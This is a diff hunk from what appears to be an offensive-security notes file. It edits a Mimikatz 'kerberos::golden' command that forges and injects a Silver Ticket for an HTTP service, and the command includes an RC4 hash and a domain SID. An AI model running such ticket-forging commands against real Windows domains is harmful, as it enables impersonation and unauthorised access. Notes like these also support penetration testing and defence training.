@@ -41,7 +41,7 @@ In order to do so, the following parameters are required:
 
 **Having this information we can now create and use the Silver Ticket on any Windows computer connected to the internet Service**
 ```
-kerberos::golden /user:NyaMeeEain /domain:insomnia.com /rc4:f94f2c839c60291406bd87a2142a2072 /sid:S-1-5-21-3063796876-3415205720-618848691 /id:1234 /target:XXXXXXX.net /service:HTTP /ptt
+kerberos::golden /user:NyaMeeEain /domain:insomnia.io /rc4:f94f2c839c60291406bd87a2142a2072 /sid:S-1-5-21-3063796876-3415205720-618848691 /id:1234 /target:XXXXXXX.net /service:HTTP /ptt
 
 ```
 # Azure AD Connect
